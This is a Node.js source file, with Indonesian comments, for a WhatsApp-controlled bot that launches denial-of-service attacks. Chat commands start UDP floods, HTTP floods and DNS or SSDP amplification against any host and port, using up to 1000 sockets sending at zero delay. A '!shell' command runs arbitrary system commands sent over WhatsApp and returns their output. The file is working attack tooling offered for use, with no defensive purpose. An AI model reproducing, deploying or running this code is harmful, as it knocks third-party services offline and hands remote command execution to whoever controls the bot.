const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const readline = require('readline');
const { exec } = require('child_process');
const { createSocket } = require('dgram');
const crypto = require('crypto'); // Tambahkan import crypto secara eksplisit
const net = require('net');
const os = require('os');

// Konfigurasi bot
const CONFIG = {
    prefix: '!',
    ownerNumber: '6281280174445', // Nomor WhatsApp Anda
    authPath: './auth_info_baileys',
    logLevel: 'silent',
    attackDelay: 0,
    maxThreads: 1000,
    maxPacketSize: 65507
};

// State aplikasi
const state = {
    attacks: {},
    sockets: [],
    totalPacketsSent: 0,
    totalBytesSent: 0,
    startTime: Date.now()
};

// Readline interface
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Membuat buffer random
const randomBytes = (size) => {
    return crypto.randomBytes(size);
};

// Fungsi untuk mengecek status target
const checkTarget = (target, port = 80) => {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(5000);
        
        let isResolved = false;
        const connectStart = Date.now();
        
        socket.on('connect', () => {
            if (isResolved) return;
            socket.destroy();
            isResolved = true;
            resolve({
                status: 'up',
                message: 'Target hidup dan dapat diakses',
                isUp: true,
                latency: Date.now() - connectStart
            });
        });
        
        socket.on('timeout', () => {
            if (isResolved) return;
            socket.destroy();
            isResolved = true;
            resolve({
                status: 'timeout',
                message: 'Koneksi timeout - target mungkin down',
                isUp: false
            });
        });
        
        socket.on('error', (err) => {
            if (isResolved) return;
            socket.destroy();
            isResolved = true;
            
            if (err.code === 'ECONNREFUSED') {
                resolve({
                    status: 'port_closed',
                    message: `Port ${port} tertutup tapi host hidup`,
                    isUp: true
                });
            } else {
                resolve({
                    status: 'error',
                    message: `Target tidak dapat diakses: ${err.message}`,
                    isUp: false
                });
            }
        });
        
        socket.connect(port, target);
    });
};

// Fungsi untuk menjalankan perintah shell
const runCommand = (command) => {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(error);
                return;
            }
            resolve(stdout || stderr);
        });
    });
};

// Jenis-jenis payload serangan
const ATTACK_PAYLOADS = {
    // Basic UDP flood
    udp: () => randomBytes(512),
    
    // HTTP flood
    http: (target) => {
        const paths = ['/', '/index.php', '/login', '/admin', '/api/v1/users', '/search'];
        const path = paths[Math.floor(Math.random() * paths.length)];
        const httpReq = `GET ${path} HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n`;
        return Buffer.from(httpReq);
    },
    
    // DNS amplification
    dns: () => {
        return Buffer.from([
            0x00, 0x00, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x03, 0x77, 0x77, 0x77,
            0x06, 0x67, 0x6f, 0x6f, 0x67, 0x6c, 0x65, 0x03,
            0x63, 0x6f, 0x6d, 0x00, 0x00, 0x01, 0x00, 0x01
        ]);
    },
    
    // SSDP amplification
    ssdp: () => {
        return Buffer.from(
            'M-SEARCH * HTTP/1.1\r\n' +
            'HOST: 239.255.255.250:1900\r\n' +
            'MAN: "ssdp:discover"\r\n' +
            'MX: 2\r\n' +
            'ST: ssdp:all\r\n\r\n'
        );
    }
};

// Fungsi untuk membuat payload serangan
const createPayload = (type, target, size) => {
    let basePayload;
    
    if (type === 'http') {
        basePayload = ATTACK_PAYLOADS.http(target);
    } else if (ATTACK_PAYLOADS[type]) {
        basePayload = ATTACK_PAYLOADS[type]();
    } else {
        basePayload = ATTACK_PAYLOADS.udp();
        type = 'udp';
    }
    
    // Buat payload dengan ukuran yang diminta
    const payload = Buffer.alloc(size);
    
    // Salin template ke awal payload
    basePayload.copy(payload);
    
    // Isi sisa dengan data random
    if (basePayload.length < size) {
        randomBytes(size - basePayload.length).copy(payload, basePayload.length);
    }
    
    return payload;
};

// Memulai serangan UDP
const startAttack = (target, port, duration, size = 1024, threads = 100, type = 'udp') => {
    console.log(`[Attack] Memulai serangan ke ${target}:${port} (${duration}s, ${threads} threads, ${size}b, ${type})`);
    
    const attackId = `${target}:${port}`;
    
    // Jika sudah ada serangan yang sama, hentikan dulu
    if (state.attacks[attackId]) {
        stopAttack(target, port);
    }
    
    // Validasi dan batasi parameter
    const actualSize = Math.min(size, CONFIG.maxPacketSize);
    const actualThreads = Math.min(threads, CONFIG.maxThreads);
    
    // Generate payload
    const payload = createPayload(type, target, actualSize);
    
    // Buat socket
    const sockets = [];
    for (let i = 0; i < actualThreads; i++) {
        try {
            const socket = createSocket('udp4');
            socket.on('error', () => {});
            socket.unref();
            sockets.push(socket);
            state.sockets.push(socket);
        } catch (err) {
            console.error(`Error socket: ${err.message}`);
        }
    }
    
    // Statistik attack
    const stats = {
        packetsSent: 0,
        bytesSent: 0,
        startTime: Date.now()
    };
    
    // Interval untuk mengirim paket
    const intervalId = setInterval(() => {
        for (const socket of sockets) {
            try {
                // Kirim beberapa paket sekaligus untuk setiap socket
                for (let i = 0; i < 10; i++) {
                    socket.send(payload, 0, payload.length, port, target, (err) => {
                        if (!err) {
                            stats.packetsSent++;
                            stats.bytesSent += payload.length;
                            state.totalPacketsSent++;
                            state.totalBytesSent += payload.length;
                        }
                    });
                }
            } catch (err) {
                // Ignore errors
            }
        }
    }, CONFIG.attackDelay);
    
    // Simpan info attack
    state.attacks[attackId] = {
        target,
        port,
        intervalId,
        sockets,
        type,
        stats,
        duration,
        size: actualSize,
        threads: actualThreads,
        startTime: Date.now()
    };
    
    // Set timeout untuk menghentikan attack
    if (duration > 0) {
        setTimeout(() => {
            stopAttack(target, port);
        }, duration * 1000);
    }
    
    return attackId;
};

// Menghentikan serangan
const stopAttack = (target, port) => {
    const attackId = `${target}:${port}`;
    const attack = state.attacks[attackId];
    
    if (!attack) {
        return false;
    }
    
    clearInterval(attack.intervalId);
    
    for (const socket of attack.sockets) {
        try {
            socket.close();
            const index = state.sockets.indexOf(socket);
            if (index !== -1) {
                state.sockets.splice(index, 1);
            }
        } catch (err) {
            // Ignore errors
        }
    }
    
    console.log(`[Attack] Menghentikan serangan ke ${target}:${port}`);
    
    // Statistik akhir
    const elapsed = (Date.now() - attack.stats.startTime) / 1000;
    console.log(`[Stats] Serangan selesai: ${attack.stats.packetsSent} paket (${Math.round(attack.stats.bytesSent / (1024 * 1024))} MB) dalam ${elapsed.toFixed(2)}s`);
    
    delete state.attacks[attackId];
    
    return true;
};

// Fungsi untuk menggunakan QR code login sebagai fallback
const connectWithQR = async (sock) => {
    console.log("\nMenggunakan mode QR code sebagai fallback...");
    console.log("Silakan scan QR code berikut di WhatsApp Anda:");
    
    // Tunggu QR code atau koneksi terbuka
    return new Promise((resolve) => {
        const checkInterval = setInterval(() => {
            if (sock.user) {
                clearInterval(checkInterval);
                resolve(true);
            }
        }, 1000);
    });
};

// Fungsi untuk meminta kode pairing
const requestPairingCode = async (sock) => {
    try {
        // Tanya nomor WhatsApp
        const phoneNumber = await new Promise((resolve) => {
            rl.question('Masukkan nomor WhatsApp (format: 628xxxxx): ', (answer) => {
                resolve(answer.trim());
            });
        });
        
        // Validasi format nomor
        if (!phoneNumber.match(/^\d+$/)) {
            console.log('Nomor telepon hanya boleh berisi angka tanpa spasi atau karakter khusus');
            return await requestPairingCode(sock);
        }
        
        console.log(`\nMeminta kode pairing untuk nomor ${phoneNumber}...`);
        
        try {
            // Minta kode pairing
            const code = await sock.requestPairingCode(phoneNumber);
            
            console.log('\n==================================');
            console.log(`KODE PAIRING: ${code}`);
            console.log('==================================\n');
            console.log('Masukkan kode ini di WhatsApp untuk menautkan perangkat');
        } catch (error) {
            console.error('Error saat meminta kode pairing:', error);
            console.log('Mencoba metode login dengan QR code...');
            await connectWithQR(sock);
        }
    } catch (error) {
        console.error('Error dalam requestPairingCode:', error);
        await connectWithQR(sock);
    }
};

// Handle perintah dari chat WhatsApp
const handleCommand = async (sock, msg, command, params) => {
    const sender = msg.key.remoteJid;
    const isSenderOwner = sender.includes(CONFIG.ownerNumber);
    
    // Hanya owner yang bisa menggunakan command
    if (!isSenderOwner && command !== 'ping') {
        await sock.sendMessage(sender, { text: '⛔ Anda tidak memiliki akses untuk perintah ini.' }, { quoted: msg });
        return;
    }
    
    try {
        switch (command) {
            case 'ping':
                await sock.sendMessage(sender, { text: '🟢 Pong! Bot aktif.' }, { quoted: msg });
                break;
                
            case 'attack':
                if (params.length < 3) {
                    await sock.sendMessage(sender, { 
                        text: `⚠️ Penggunaan: !attack <target> <port> <durasi> [ukuran] [threads] [tipe]

Tipe serangan:
- udp: UDP Flood standar (default)
- http: HTTP Flood
- dns: DNS Amplification
- ssdp: SSDP Amplification`
                    }, { quoted: msg });
                    return;
                }
                
                const [target, port, duration, size = 1024, threads = 500, type = 'udp'] = params;
                
                if (isNaN(port) || isNaN(duration)) {
                    await sock.sendMessage(sender, { text: '⚠️ Port dan durasi harus berupa angka.' }, { quoted: msg });
                    return;
                }
                
                // Cek status target dulu
                await sock.sendMessage(sender, { text: `🔍 Mengecek status target ${target}:${port}...` }, { quoted: msg });
                
                const status = await checkTarget(target, parseInt(port));
                
                let statusEmoji = status.isUp ? '🟢' : '🔴';
                await sock.sendMessage(sender, { 
                    text: `${statusEmoji} Status Target: ${target}:${port}
Status: ${status.status}
Message: ${status.message}
Hidup: ${status.isUp ? 'Ya' : 'Tidak'}`
                }, { quoted: msg });
                
                // Mulai serangan
                const attackId = startAttack(
                    target, 
                    parseInt(port), 
                    parseInt(duration),
                    parseInt(size),
                    parseInt(threads),
                    type
                );
                
                await sock.sendMessage(sender, { 
                    text: `🚀 Serangan UDP dimulai!
Target: ${target}:${port}
Durasi: ${duration} detik
Ukuran: ${size} bytes
Threads: ${threads}
Tipe: ${type}
ID: ${attackId}`
                }, { quoted: msg });
                break;
                
            case 'stop':
                if (params.length < 2) {
                    await sock.sendMessage(sender, { text: '⚠️ Penggunaan: !stop <target> <port>' }, { quoted: msg });
                    return;
                }
                
                const [stopTarget, stopPort] = params;
                const stopped = stopAttack(stopTarget, parseInt(stopPort));
                
                if (stopped) {
                    await sock.sendMessage(sender, { text: `✅ Serangan ke ${stopTarget}:${stopPort} dihentikan.` }, { quoted: msg });
                } else {
                    await sock.sendMessage(sender, { text: `⚠️ Tidak ada serangan aktif ke ${stopTarget}:${stopPort}.` }, { quoted: msg });
                }
                break;
                
            case 'stopall':
                let count = 0;
                for (const attackId in state.attacks) {
                    const [t, p] = attackId.split(':');
                    if (stopAttack(t, parseInt(p))) {
                        count++;
                    }
                }
                
                await sock.sendMessage(sender, { text: `✅ ${count} serangan dihentikan.` }, { quoted: msg });
                break;
                
            case 'list':
                if (Object.keys(state.attacks).length === 0) {
                    await sock.sendMessage(sender, { text: '📋 Tidak ada serangan aktif.' }, { quoted: msg });
                    return;
                }
                
                let listMessage = '📋 Daftar serangan aktif:\n\n';
                for (const attackId in state.attacks) {
                    const attack = state.attacks[attackId];
                    const elapsedTime = Math.floor((Date.now() - attack.startTime) / 1000);
                    const remainingTime = attack.duration - elapsedTime;
                    
                    listMessage += `Target: ${attack.target}:${attack.port}\n`;
                    listMessage += `Tipe: ${attack.type}\n`;
                    listMessage += `Threads: ${attack.threads}\n`;
                    listMessage += `Ukuran: ${attack.size} bytes\n`;
                    listMessage += `Durasi: ${attack.duration}s\n`;
                    listMessage += `Waktu berjalan: ${elapsedTime}s\n`;
                    listMessage += `Sisa waktu: ${Math.max(0, remainingTime)}s\n`;
                    listMessage += `Paket terkirim: ${attack.stats.packetsSent.toLocaleString()}\n`;
                    listMessage += `Data terkirim: ${Math.round(attack.stats.bytesSent / (1024 * 1024))} MB\n\n`;
                }
                
                await sock.sendMessage(sender, { text: listMessage }, { quoted: msg });
                break;
                
            case 'check':
                if (params.length < 1) {
                    await sock.sendMessage(sender, { text: '⚠️ Penggunaan: !check <target> [port]' }, { quoted: msg });
                    return;
                }
                
                const [checkTarget, checkPort = 80] = params;
                
                await sock.sendMessage(sender, { text: `🔍 Mengecek status ${checkTarget}:${checkPort}...` }, { quoted: msg });
                
                const targetStatus = await checkTarget(checkTarget, parseInt(checkPort));
                
                let statusIcon = targetStatus.isUp ? '🟢' : '🔴';
                await sock.sendMessage(sender, { 
                    text: `${statusIcon} Status Target: ${checkTarget}:${checkPort}
Status: ${targetStatus.status}
Message: ${targetStatus.message}
Hidup: ${targetStatus.isUp ? 'Ya' : 'Tidak'}
${targetStatus.latency ? `Latency: ${targetStatus.latency}ms` : ''}`
                }, { quoted: msg });
                break;
                
            case 'info':
                // Informasi server
                const serverInfo = {
                    hostname: os.hostname(),
                    platform: os.platform(),
                    cpuCount: os.cpus().length,
                    cpuModel: os.cpus()[0].model,
                    totalMemory: Math.round(os.totalmem() / (1024 * 1024 * 1024)) + ' GB',
                    freeMemory: Math.round(os.freemem() / (1024 * 1024 * 1024)) + ' GB',
                    uptime: Math.floor(os.uptime() / 3600) + ' hours'
                };
                
                // Hitung uptime bot
                const botUptime = Math.floor((Date.now() - state.startTime) / 1000);
                const days = Math.floor(botUptime / 86400);
                const hours = Math.floor((botUptime % 86400) / 3600);
                const minutes = Math.floor((botUptime % 3600) / 60);
                const seconds = botUptime % 60;
                
                // Hitung traffic
                const totalMB = Math.round(state.totalBytesSent / (1024 * 1024));
                const totalGB = (totalMB / 1024).toFixed(2);
                
                const infoMessage = `📊 Informasi Bot & Server

🤖 Bot Info:
- Uptime: ${days}d ${hours}h ${minutes}m ${seconds}s
- Total paket terkirim: ${state.totalPacketsSent.toLocaleString()}
- Total traffic: ${totalGB} GB

💻 Server Info:
- Hostname: ${serverInfo.hostname}
- Platform: ${serverInfo.platform}
- CPU: ${serverInfo.cpuModel} (${serverInfo.cpuCount} cores)
- Memory: ${serverInfo.freeMemory} free / ${serverInfo.totalMemory} total
- System uptime: ${serverInfo.uptime}

⚔️ Attack Status:
- Serangan aktif: ${Object.keys(state.attacks).length}`;

                await sock.sendMessage(sender, { text: infoMessage }, { quoted: msg });
                break;
                
            case 'shell':
                if (!isSenderOwner) {
                    await sock.sendMessage(sender, { text: '⛔ Perintah ini hanya untuk owner.' }, { quoted: msg });
                    return;
                }
                
                if (params.length === 0) {
                    await sock.sendMessage(sender, { text: '⚠️ Penggunaan: !shell <command>' }, { quoted: msg });
                    return;
                }
                
                const shellCommand = params.join(' ');
                try {
                    const result = await runCommand(shellCommand);
                    await sock.sendMessage(sender, { text: `🖥️ Output:\n\n${result || 'Tidak ada output'}` }, { quoted: msg });
                } catch (error) {
                    await sock.sendMessage(sender, { text: `❌ Error: ${error.message}` }, { quoted: msg });
                }
                break;
                
            case 'help':
                const helpMessage = `📚 Daftar Perintah UDP Attack Bot:

⚡ Attack Commands:
!attack <target> <port> <durasi> [ukuran] [threads] [tipe] - Mulai serangan UDP
!stop <target> <port> - Hentikan serangan ke target
!stopall - Hentikan semua serangan aktif
!list - Tampilkan daftar serangan aktif

🔍 Tools & Monitoring:
!check <target> [port] - Cek status target
!info - Tampilkan info server dan bot
!ping - Cek status bot

🖥️ System Commands:
!shell <command> - Jalankan perintah shell (owner only)

❓ Misc:
!help - Tampilkan pesan ini

Tipe serangan yang tersedia:
- udp: UDP Flood standar
- http: HTTP Flood
- dns: DNS Amplification
- ssdp: SSDP Amplification`;

                await sock.sendMessage(sender, { text: helpMessage }, { quoted: msg });
                break;
                
            default:
                await sock.sendMessage(sender, { text: `⚠️ Perintah tidak dikenal: ${command}\nGunakan !help untuk melihat daftar perintah.` }, { quoted: msg });
        }
    } catch (error) {
        console.error('Error saat menangani command:', error);
        await sock.sendMessage(sender, { text: `❌ Terjadi kesalahan: ${error.message}` }, { quoted: msg });
    }
};

// Fungsi utama untuk menjalankan bot
async function startBot() {
    console.log('='.repeat(50));
    console.log('🚀 UDP ATTACK BOT - FINAL VERSION');
    console.log('='.repeat(50));
    
    // Buat folder auth jika belum ada
    if (!fs.existsSync(CONFIG.authPath)) {
        fs.mkdirSync(CONFIG.authPath, { recursive: true });
    }
    
    // Batasi jumlah listener untuk event emitter
    process.setMaxListeners(20);
    
    // Inisialisasi auth state
    const { state: authState, saveCreds } = await useMultiFileAuthState(CONFIG.authPath);
    
    // Setup logger
    const logger = pino({ level: CONFIG.logLevel });
    
    // Buat socket WhatsApp
    const sock = makeWASocket({
        auth: authState,
        printQRInTerminal: true, // Aktifkan QR code sebagai fallback
        logger,
        browser: ['Chrome (Linux)', 'Chrome', '103.0.5060.114'],
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        emitOwnEvents: false
    });
    
    // Handle koneksi
    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        if (connection === 'open') {
            console.log('\n✅ Bot terhubung ke WhatsApp!');
            console.log(`📱 Nomor: ${sock.user.id.split(':')[0]}`);
        }
        
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            
            console.log('\n❌ Koneksi terputus');
            if (shouldReconnect) {
                console.log('🔄 Mencoba menghubungkan ulang...');
                
                // Cleanup resources
                for (const attackId in state.attacks) {
                    const [t, p] = attackId.split(':');
                    stopAttack(t, parseInt(p));
                }
                
                // Wait 3 seconds and try again
                setTimeout(() => {
                    startBot();
                }, 3000);
            } else {
                console.log('❌ Logged out, tidak menghubungkan ulang');
                process.exit(0);
            }
        }
        
        // Request pairing code when connecting and QR not scanned
        if (connection === 'connecting' && !qr) {
            setTimeout(async () => {
                if (!sock.user) {
                    await requestPairingCode(sock);
                }
            }, 5000);
        }
    });
    
    // Handle pesan masuk
    sock.ev.on('messages.upsert', async (m) => {
        if (m.type !== 'notify') return;
        
        for (const msg of m.messages) {
            try {
                if (!msg.message) continue;
                
                const msgType = Object.keys(msg.message)[0];
                let msgText = '';
                
                // Extract text from message
                if (msgType === 'conversation') {
                    msgText = msg.message.conversation;
                } else if (msgType === 'extendedTextMessage') {
                    msgText = msg.message.extendedTextMessage.text;
                } else {
                    continue;
                }
                
                // Check if message is a command
                if (!msgText.startsWith(CONFIG.prefix)) continue;
                
                const cmdParts = msgText.slice(CONFIG.prefix.length).trim().split(/\s+/);
                const command = cmdParts[0].toLowerCase();
                const params = cmdParts.slice(1);
                
                console.log(`[Command] ${command} ${params.join(' ')}`);
                await handleCommand(sock, msg, command, params);
            } catch (error) {
                console.error('Error saat memproses pesan:', error);
            }
        }
    });
    
    // Handle credentials update
    sock.ev.on('creds.update', saveCreds);
    
    // Handle process exit
    process.on('SIGINT', async () => {
        console.log('\n🛑 Menghentikan bot...');
        
        // Hentikan semua serangan
        for (const attackId in state.attacks) {
            const [target, port] = attackId.split(':');
            stopAttack(target, parseInt(port));
        }
        
        // Bersihkan socket
        for (const socket of state.sockets) {
            try {
                socket.close();
            } catch (err) {}
        }
        
        console.log('👋 Bot dihentikan.');
        process.exit(0);
    });
    
    return sock;
}

// Mulai bot
console.log('Memulai UDP Attack Bot...');
startBot().catch(err => {
    console.error('❌ Error saat menjalankan bot:', err);
    console.log('🔄 Mencoba ulang dalam 5 detik...');
    setTimeout(() => {
        startBot();
    }, 5000);
});
